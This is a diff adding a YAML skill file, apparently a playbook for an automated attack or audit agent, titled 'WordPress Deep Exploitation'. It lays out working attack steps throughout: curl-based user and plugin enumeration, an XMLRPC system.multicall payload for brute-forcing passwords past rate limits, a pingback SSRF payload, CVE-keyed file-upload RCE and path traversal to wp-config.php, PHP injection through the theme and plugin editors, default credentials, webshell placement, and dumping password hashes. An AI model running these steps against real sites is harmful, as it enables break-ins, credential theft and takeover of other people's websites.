@@ -1,0 +1,122 @@
+id: wordpress-deep
+name: "WordPress Deep Exploitation"
+description: "WordPress-specific attack surface: plugins, themes, REST API, xmlrpc, wp-cron, misconfigs"
+version: 1
+applicable_roles: [attack, audit]
+tags: [wordpress, wp, cms, plugins, themes, xmlrpc, wp-json, wpscan, php]
+triggers:
+  - "wp-content"
+  - "wp-includes"
+  - "wp-admin"
+  - "wp-json"
+  - "xmlrpc\\.php"
+  - "wordpress"
+  - "wp-login"
+  - "/wp-content/plugins/"
+  - "/wp-content/themes/"
+  - "wp-cron"
+  - "woocommerce"
+  - "elementor"
+  - "contact-form-7"
+  - "yoast"
+  - "wp-file-manager"
+estimated_tokens: 800
+content: |
+  ## WordPress Deep Exploitation
+
+  ### Step 1: Fingerprinting
+  **Version and plugin enumeration** (low-noise first):
+  - `curl -s TARGET/readme.html` — WP version in title
+  - `curl -s TARGET/wp-json/` — REST API root; `namespaces` reveal installed plugins
+  - `curl -s TARGET/feed/` — generator tag: `<generator>https://wordpress.org/?v=X.X.X</generator>`
+  - `curl -s TARGET/ | grep -oP 'ver=[\d.]+'` — asset version query strings leak WP + plugin versions
+  - `curl -s TARGET/wp-content/plugins/` — directory listing if enabled (gold mine)
+  - Probe individual plugin readmes: `curl -s TARGET/wp-content/plugins/SLUG/readme.txt | grep -i "stable tag"`
+
+  **If wp_fingerprint tool is available**, call it first — it returns structured (plugin, version, CVE, exploit_hints) data.
+
+  ### Step 2: User Enumeration
+  - REST API: `curl -s TARGET/wp-json/wp/v2/users` — returns usernames and slugs (often enabled by default)
+  - Author archives: `curl -s TARGET/?author=1` — redirects to `/author/USERNAME/`
+  - Login error oracle: `POST /wp-login.php` with known username — "incorrect password" vs "invalid username"
+  - XMLRPC: `wp.getUsersBlogs` method leaks valid usernames with correct password attempts
+
+  ### Step 3: XMLRPC Attacks
+  **Confirm XMLRPC is active**: `curl -s TARGET/xmlrpc.php` — should return "XML-RPC server accepts POST requests only."
+
+  **Brute-force via system.multicall** (bypasses rate-limiting — tests hundreds of passwords in one HTTP request):
+  ```xml
+  <?xml version="1.0"?>
+  <methodCall>
+    <methodName>system.multicall</methodName>
+    <params><param><value><array><data>
+      <value><struct>
+        <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
+        <member><name>params</name><value><array><data>
+          <value>admin</value><value>password1</value>
+        </data></array></value></member>
+      </struct></value>
+      <!-- repeat for each password -->
+    </data></array></value></param></params>
+  </methodCall>
+  ```
+
+  **Pingback SSRF**: `pingback.ping` method — can probe internal services:
+  ```xml
+  <?xml version="1.0"?>
+  <methodCall>
+    <methodName>pingback.ping</methodName>
+    <params>
+      <param><value>http://INTERNAL-HOST:PORT/</value></param>
+      <param><value>TARGET/any-existing-post</value></param>
+    </params>
+  </methodCall>
+  ```
+
+  ### Step 4: High-Value Plugin Vulnerabilities
+  Try these in order (highest ROI first):
+
+  **Arbitrary file upload** (unauthenticated RCE):
+  - WP File Manager (CVE-2020-25213): `POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`
+  - Duplicator (CVE-2020-11738): path traversal via `installer-backup.php`
+  - Contact Form 7 (CVE-2020-35489): unrestricted upload via `.php.` double-extension
+
+  **SQL injection**:
+  - Check all plugin AJAX endpoints: `POST /wp-admin/admin-ajax.php?action=PLUGIN_ACTION`
+  - GiveWP, LayerSlider, WP Statistics — historically rich SQLi targets
+
+  **LFI/Path traversal**:
+  - Theme/plugin file parameters: `?file=../../../wp-config.php`
+  - `wp-config.php` is the holy grail — contains DB creds, auth keys, table prefix
+
+  ### Step 5: Authenticated Exploitation
+  Once you have valid creds (even subscriber-level):
+
+  **Admin-level (editor/admin)**:
+  - Theme Editor: `POST /wp-admin/theme-editor.php` — inject PHP into `404.php` or `functions.php`, then `GET /wp-content/themes/THEME/404.php`
+  - Plugin Editor: `/wp-admin/plugin-editor.php` — edit any installed plugin's PHP
+  - Plugin Install: `/wp-admin/plugin-install.php` — upload malicious ZIP as a "plugin"
+  - Media Upload: `POST /wp-admin/admin-ajax.php?action=upload-attachment`
+
+  **Subscriber/Author escalation**:
+  - Check for plugins granting upload capabilities to low-privilege roles
+  - Author-level users can upload media — try `.phtml`, `.php5`, `.shtml` extensions
+  - REST API: `POST /wp-json/wp/v2/posts` — some plugins expose write endpoints to subscribers
+
+  ### Step 6: wp-cron Abuse
+  - `curl -s TARGET/wp-cron.php` — triggers scheduled tasks; can be used for timing attacks
+  - Some plugins register cron hooks that perform privileged operations (email sends, cache rebuilds)
+  - DoS vector: repeated wp-cron triggers under load
+
+  ### Step 7: Common Misconfigurations
+  - `wp-config.php` backup files: try `wp-config.php.bak`, `wp-config.php~`, `wp-config.php.save`, `wp-config.php.swp`, `.wp-config.php.swp`
+  - Debug mode: `?debug=true` or check for `WP_DEBUG` output in HTML comments
+  - Directory listing: `/wp-content/uploads/`, `/wp-content/backup-db/`
+  - Exposed phpinfo: `/wp-content/plugins/*/phpinfo.php`
+  - Default creds: `admin/admin`, `admin/password`, `admin/<sitename>`
+
+  ### Post-Exploitation
+  - Webshells land in: `/wp-content/uploads/YYYY/MM/shell.php`
+  - Read `wp-config.php` for DB credentials, secret keys, and table prefix
+  - DB access → dump `wp_users` table for all password hashes
+  - Check `wp_options` for `siteurl`, `active_plugins`, custom secrets
